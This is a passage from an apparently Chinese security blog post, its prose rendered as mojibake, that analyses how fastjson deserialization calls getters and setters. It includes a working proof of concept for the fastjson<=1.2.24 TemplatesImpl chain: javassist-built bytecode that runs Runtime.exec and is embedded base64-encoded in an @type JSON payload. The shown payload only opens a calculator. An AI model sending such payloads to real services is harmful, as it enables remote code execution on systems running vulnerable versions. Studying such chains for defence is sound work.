</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">age</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">age</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œå°±ç›´æ¥èšç„¦äºååºåˆ—åŒ–äº†ï¼Œå…¶å®é‡ç‚¹å°±æ˜¯ä¸¤ä¸ªåœ°æ–¹ï¼Œæ–¹æ³•çš„è·å–ä»¥åŠè°ƒç”¨ï¼Œå¯¹äºæ–¹æ³•çš„è·å–ï¼Œåœ¨å‰é¢éƒ½æ˜¯æåˆ°äº†ï¼Œå¯¹äºæ–¹æ³•çš„è°ƒç”¨æ˜¯ä¸€ç¬”å¸¦è¿‡çš„ï¼Œè¿™é‡Œå…·ä½“åˆ†æä¸€ä¸‹ï¼Œå½“æ—¶æåˆ°äº†ä¼šæœ‰å¯¹getteræ–¹æ³•çš„å¤„ç†ï¼Œå› ä¸ºæˆ‘ä»¬è¿™é‡Œè·å–æ–¹æ³•æ˜¯ç›´æ¥è°ƒç”¨çš„<code>getMethods()</code>æ¥è¿›è¡Œçš„ï¼Œè¿™é‡Œå…ˆä»ååºåˆ—åŒ–è°ƒç”¨setterçš„ä»£ç æ¥çœ‹ï¼ŒåŸºæœ¬çš„è°ƒç”¨æ˜¯å·®ä¸å¤šçš„ï¼š</p>
<p>åœ¨å–æ–¹æ³•å¹¶è¿›è¡Œè°ƒç”¨çš„ä»£ç ä½äºï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250411210414182.png"
	
	
	
	loading="lazy"
	
		alt="image-20250411210414182"
	
	
></p>
<p>åœ¨setValue()æ–¹æ³•çš„è°ƒç”¨ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250411210639587.png"
	
	
	
	loading="lazy"
	
		alt="image-20250411210639587"
	
	
></p>
<p>ä¹Ÿå°±æ˜¯å‰é¢ä¼ é€’çš„fieldInfoå˜é‡ï¼Œæ­¤æ—¶çš„å˜é‡å®šä¹‰å¦‚ä¸‹ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250411210731435.png"
	
	
	
	loading="lazy"
	
		alt="image-20250411210731435"
	
	
></p>
<p>æœ€åæ˜¯å†è°ƒç”¨çš„invoke()æ–¹æ³•æ¥è¿›è¡Œçš„æ–¹æ³•è°ƒç”¨ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250411210820988.png"
	
	
	
	loading="lazy"
	
		alt="image-20250411210820988"
	
	
></p>
<p>è°ƒç”¨æ ˆä¸ºï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">setAge:42, Person (fastjson)
</span></span><span class="line"><span class="cl">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
</span></span><span class="line"><span class="cl">invoke:62, NativeMethodAccessorImpl (sun.reflect)
</span></span><span class="line"><span class="cl">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
</span></span><span class="line"><span class="cl">invoke:497, Method (java.lang.reflect)
</span></span><span class="line"><span class="cl">setValue:96, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)
</span></span><span class="line"><span class="cl">deserialze:593, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
</span></span><span class="line"><span class="cl">deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
</span></span><span class="line"><span class="cl">deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
</span></span><span class="line"><span class="cl">parseObject:639, DefaultJSONParser (com.alibaba.fastjson.parser)
</span></span><span class="line"><span class="cl">parseObject:339, JSON (com.alibaba.fastjson)
</span></span><span class="line"><span class="cl">parseObject:243, JSON (com.alibaba.fastjson)
</span></span><span class="line"><span class="cl">parseObject:456, JSON (com.alibaba.fastjson)
</span></span><span class="line"><span class="cl">main:18, Fastjson_Test (fastjson)
</span></span></code></pre></td></tr></table>
</div>
</div><p>æˆ‘ä»¬å†æ¥çœ‹ä¸€ä¸‹å…³é”®çš„sortedFieldDeserializerså˜é‡çš„èµ‹å€¼çš„åœ°æ–¹ï¼š
<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250411210215683.png"
	
	
	
	loading="lazy"
	
		alt="image-20250411210215683"
	
	
></p>
<p>å…¶å®å°±æ˜¯sortedFieldsï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢çš„<code>JavaBeanInfo.build()</code>æ–¹æ³•è°ƒç”¨çš„ç±»å˜é‡çš„ç»“æœï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250411211223545.png"
	
	
	
	loading="lazy"
	
		alt="image-20250411211223545"
	
	
></p>
<p>å…·ä½“å®ç°åœ¨ï¼š
<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250411211354987.png"
	
	
	
	loading="lazy"
	
		alt="image-20250411211354987"
	
	
></p>
<p>è¿™é‡Œä¹Ÿæ˜¯å‰é¢æ ‡æ³¨å‡ºæ¥çš„ï¼Œæ•°ç»„copyè¿‡ç¨‹ï¼Œè¿™é‡Œå°±æ¶‰åŠåˆ°äº†ä¸€ä¸ªéå¸¸é‡è¦çš„å˜é‡ï¼š<code>fielList</code> ï¼Œä¹Ÿæ˜¯å½¢å‚ä¼ é€’çš„ä¸€ä¸ªå˜é‡ï¼Œå›è¿‡å»çœ‹è¿™ä¸ªå˜é‡çš„èµ‹å€¼æƒ…å†µï¼Œå¯ä»¥å‘ç°ä¸»è¦æ˜¯é€šè¿‡ä¸‹é¢è¿™ä¸ªæ–¹æ³•æ¥è¿›è¡Œèµ‹å€¼çš„ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250411211956349.png"
	
	
	
	loading="lazy"
	
		alt="image-20250411211956349"
	
	
></p>
<p>å¹¶ä¸”è¿™ä¸ªæ˜¯å­˜åœ¨äºå¤„ç†getteræ–¹æ³•çš„é€»è¾‘ä¸­çš„ï¼Œæˆ‘ä»¬å»çœ‹ä¸€ä¸‹éœ€è¦å¤„ç†çš„æ¡ä»¶ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250411212246987.png"
	
	
	
	loading="lazy"
	
		alt="image-20250411212246987"
	
	
></p>
<p><strong>æ–¹æ³•åå­—é•¿åº¦å¾—å¤§äº4ï¼Œç„¶åä¸èƒ½æ˜¯é™æ€æ–¹æ³•ï¼Œç„¶åéœ€è¦ä»¥getå¼€å¤´</strong>ï¼Œè¿˜æœ‰æ¡ä»¶å¦‚ä¸‹ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250411212347411.png"
	
	
	
	loading="lazy"
	
		alt="image-20250411212347411"
	
	
></p>
<p>éœ€è¦æ»¡è¶³è¿™ä¸ªæ–¹æ³•çš„<strong>è¿”å›å€¼æ˜¯è¿™å‡ ä¸ªç±»å‹ä¸­çš„å…¶ä¸­ä¸€ä¸ª</strong>æ‰èƒ½è¿›å…¥åé¢çš„æ¡ä»¶ï¼Œå¹¶ä¸”è¿˜éœ€è¦è¿™ä¸ªå˜é‡æ²¡æœ‰setterï¼Œåªæœ‰getter ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250411214506898.png"
	
	
	
	loading="lazy"
	
		alt="image-20250411214506898"
	
	
></p>
<p>è·Ÿè¿›è¿™é‡Œå…³é”®çš„getField()æ–¹æ³•ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250411214547418.png"
	
	
	
	loading="lazy"
	
		alt="image-20250411214547418"
	
	
></p>
<p>ä»ä¸Šé¢çš„ä»£ç å¯ä»¥çœ‹å‡ºæ¥ï¼Œè¿™é‡Œéœ€è¦è¿”å›nullï¼Œçœ‹è¿™é‡Œçš„ä»£ç é€»è¾‘ï¼Œå°±æ˜¯åˆ¤æ–­è¿™ä¸ªfieldListæ˜¯å¦æœ‰ç›¸åŒçš„å­—æ®µåç§°ï¼Œè€Œåœ¨å‰é¢çš„fieldListèµ‹å€¼é€»è¾‘ä¸­ï¼Œæ˜¯å…ˆå¤„ç†çš„setterï¼Œç„¶åæ‰æ˜¯å¤„ç†çš„getterï¼Œä¸ºäº†è¿™é‡Œèƒ½è¿”å›nullï¼Œæ‰€ä»¥<strong>éœ€è¦è¿™ä¸ªå­—æ®µæ²¡æœ‰setter</strong>ï¼Œè¿™fieldListä¸­æ‰ä¸ä¼šæœ‰è¿™ä¸ª&quot;name&quot; ï¼ŒåŸºäºä¸Šé¢çš„æ¡ä»¶ï¼Œå¯ä»¥è¿›è¡Œå¦‚ä¸‹ä»£ç æµ‹è¯•ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">fastjson</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSON</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Map</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Fastjson_Test</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Person</span><span class="w"> </span><span class="n">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Person</span><span class="p">)</span><span class="n">JSON</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="s">&#34;{\&#34;map\&#34;:{}}&#34;</span><span class="p">,</span><span class="n">Person</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">class</span> <span class="nc">Person</span><span class="w">  </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">Map</span><span class="w"> </span><span class="n">map</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">Person</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">Map</span><span class="w"> </span><span class="nf">getMap</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="s">&#34;open -a Calculator&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">map</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>è¿è¡ŒæˆåŠŸå¼¹å‡ºè®¡ç®—æœºã€‚å¦‚ä¸‹å‡ ä¸ªç‚¹è¯´æ˜ï¼š</p>
<ul>
<li>ä¸ºä»€ä¹ˆæ˜¯ååºåˆ—åŒ–çš„<code>{&quot;map&quot;:{}}</code>ï¼Œå…¶å®è¿™ä¸ªç‚¹æ˜¯åœ¨ä¸‹é¢çš„fastjson&lt;=1.2.24çš„TemplatesImplé“¾è¯´è¿‡çš„ï¼Œä¹Ÿå°±æ˜¯å¦‚æœjsonå­—ç¬¦ä¸²æ²¡æœ‰å¯¹å˜é‡è¿›è¡Œèµ‹å€¼ï¼Œfastjsonä¼šè·å–è¿™ä¸ªå˜é‡çš„é»˜è®¤ç±»å‹çš„æ— å‚æ„é€ æ–¹æ³•è¿›è¡Œå®ä¾‹åŒ–ç„¶åèµ‹å€¼ã€‚</li>
<li>ç„¶åå°±å†è°ƒè¯•çœ‹ä¸€ä¸‹è¿™é‡Œçš„getteræ–¹æ³•çš„è°ƒç”¨ä»£ç å®ç°ï¼Œå‰é¢éƒ½è¿˜æ˜¯å·®ä¸å¤šçš„ï¼Œåˆ©ç”¨ç‚¹å˜äº†ï¼š</li>
</ul>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250411220309400.png"
	
	
	
	loading="lazy"
	
		alt="image-20250411220309400"
	
	
></p>
<p>è·Ÿè¿›è¿™ä¸ªparseField()æ–¹æ³•ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250411220549989.png"
	
	
	
	loading="lazy"
	
		alt="image-20250411220549989"
	
	
></p>
<p>è¿™é‡Œè¿˜æ˜¯ä¼šè°ƒç”¨åˆ°setValue()æ–¹æ³•ï¼š
<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250411220702606.png"
	
	
	
	loading="lazy"
	
		alt="image-20250411220702606"
	
	
></p>
<p>æœ€åè¿˜æ˜¯æˆåŠŸè°ƒç”¨invoke()æ–¹æ³•ä»è€Œè°ƒç”¨getMap()æ–¹æ³•ä»è€Œå¼¹å‡ºè®¡ç®—æœºã€‚</p>
<h2 id="åˆ©ç”¨é“¾å­¦ä¹ ">åˆ©ç”¨é“¾å­¦ä¹ 
</h2><h3 id="fastjson1224">fastjson&lt;=1.2.24
</h3><p>ä¸¤æ¡é“¾å­ï¼Œè¿™é‡Œæ¥è°ƒè¯•åˆ†æä¸€ä¸‹ï¼Œä¾èµ–ä¸ºï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;groupId&gt;</span>com.alibaba<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;artifactId&gt;</span>fastjson<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;version&gt;</span>1.2.24<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependency&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="templatesimplé“¾">TemplatesImplé“¾
</h4><p>æ—¢ç„¶éƒ½æ˜¯å¯ä»¥è°ƒç”¨getterå’Œsetteräº†ï¼Œé‚£ä¹ˆåœ¨JDK8ç¯å¢ƒä¸‹æœ€ç»å…¸çš„è¿˜æ˜¯TemplatesImplé“¾äº†ï¼Œè¿™é‡Œåˆ©ç”¨çš„getteræ–¹æ³•è¿˜æ˜¯getOutputProperties()æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•å†…éƒ¨ä¼šè°ƒç”¨åˆ°newTransformer()æ–¹æ³•ï¼Œä»è€Œå®Œæˆä¸€æ¬¡å®Œæ•´çš„é“¾å­çš„è°ƒç”¨ï¼ŒPOCå¦‚ä¸‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">fastjson</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSON</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSONObject</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.parser.Feature</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.ClassClassPath</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.ClassPool</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.CtClass</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Base64</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Fastjson_Test</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//ä½¿ç”¨javassistå®šä¹‰æ¶æ„ä»£ç </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ClassPool</span><span class="w"> </span><span class="n">classPool</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ClassPool</span><span class="p">.</span><span class="na">getDefault</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">classPool</span><span class="p">.</span><span class="na">insertClassPath</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">ClassClassPath</span><span class="p">(</span><span class="n">AbstractTranslet</span><span class="p">.</span><span class="na">class</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">CtClass</span><span class="w"> </span><span class="n">cc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">classPool</span><span class="p">.</span><span class="na">makeClass</span><span class="p">(</span><span class="s">&#34;Evil&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">cmd</span><span class="o">=</span><span class="w"> </span><span class="s">&#34;java.lang.Runtime.getRuntime().exec(\&#34;open -a Calculator\&#34;);&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">cc</span><span class="p">.</span><span class="na">makeClassInitializer</span><span class="p">().</span><span class="na">insertBefore</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">cc</span><span class="p">.</span><span class="na">setSuperclass</span><span class="p">(</span><span class="n">classPool</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">AbstractTranslet</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getName</span><span class="p">()));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">classBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cc</span><span class="p">.</span><span class="na">toBytecode</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">encodedCode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Base64</span><span class="p">.</span><span class="na">getEncoder</span><span class="p">().</span><span class="na">encodeToString</span><span class="p">(</span><span class="n">classBytes</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">encodedCode</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">json</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;{\&#34;@type\&#34;:\&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&#34;,\&#34;_name\&#34;:\&#34;fupanc\&#34;,\&#34;_bytecodes\&#34;:[\&#34;yv66vgAAADQAGwEABEV2aWwHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQEACDxjbGluaXQ+AQADKClWAQAEQ29kZQEAEWphdmEvbGFuZy9SdW50aW1lBwAKAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwADAANCgALAA4BABJvcGVuIC1hIENhbGN1bGF0b3IIABABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAASABMKAAsAFAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHABYBAAY8aW5pdD4MABgACAoAFwAZACEAAgAXAAAAAAACAAgABwAIAAEACQAAABYAAgAAAAAACrgADxIRtgAVV7EAAAAAAAEAGAAIAAEACQAAABEAAQABAAAABSq3ABqxAAAAAAABAAUAAAACAAY=\&#34;],\&#34;_class\&#34;:null,\&#34;_tfactory\&#34;:{},\&#34;_outputProperties\&#34;:{}}&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">JSONObject</span><span class="w"> </span><span class="n">jsonObject</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="n">json</span><span class="p">,</span><span class="w"> </span><span class="n">Feature</span><span class="p">.</span><span class="na">SupportNonPublicField</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>è¿è¡Œåå¼¹å‡ºè®¡ç®—æœºï¼Œè¿™é‡Œè®¾ç½®äº†<code>_outputProperties</code>æ˜¯ä¸ºäº†å¯ä»¥è°ƒç”¨åˆ°ä»–çš„getteræ–¹æ³•ï¼Œæ³¨æ„ä¸€ä¸‹è¿™é‡Œçš„ä»£ç æ„é€ ï¼Œå¯¹äº<code>byte[][]</code>ç±»å‹çš„æ•°æ®ï¼Œç”±äºbase64ç¼–ç åªèƒ½ç¼–ç <code>byte[]</code>ç±»å‹çš„æ•°æ®ï¼Œæ‰€ä»¥è¿™å°±åˆåŠ äº†ä¸€ä¸ªæ•°ç»„å°†å…¶è½¬æ¢æˆ<code>[][]</code>ç±»å‹çš„æ•°æ®ã€‚</p>
<p>è¿™é‡Œå°±è¯´æ˜å‡ ä¸ªç‚¹ï¼Œç®—æ˜¯æ¯”è¾ƒå…³é”®çš„ç‚¹ï¼š</p>
<ul>
<li>ç½‘ä¸Šæœ‰çš„payloadæ²¡ç®¡<code>_class</code>å˜é‡ï¼Œè¿™æ˜¯å› ä¸ºè¿™ä¸ªå˜é‡é»˜è®¤æ˜¯nullï¼š</li>
</ul>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250411180902467.png"
	
	
	
	loading="lazy"
	
		alt="image-20250411180902467"
	
	
></p>
<ul>
<li>è¿™é‡Œå¹¶æ²¡æœ‰å¯¹<code>_tfactory</code>å˜é‡è¿›è¡Œèµ‹å€¼ï¼Œè¿™æ˜¯å› ä¸ºå¦‚æœjsonå­—ç¬¦ä¸²æ²¡æœ‰å¯¹å˜é‡è¿›è¡Œèµ‹å€¼ï¼Œfastjsonä¼šè·å–è¿™ä¸ªå˜é‡çš„é»˜è®¤ç±»å‹çš„æ— å‚æ„é€ æ–¹æ³•è¿›è¡Œå®ä¾‹åŒ–ç„¶åèµ‹å€¼ï¼Œè€Œè¿™é‡Œåˆšå¥½æ˜¯æˆ‘ä»¬éœ€è¦çš„ç±»å‹ï¼š</li>
</ul>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250411181545359.png"
	
	
	
	loading="lazy"
	
		alt="image-20250411181545359"
	
	
></p>
<ul>
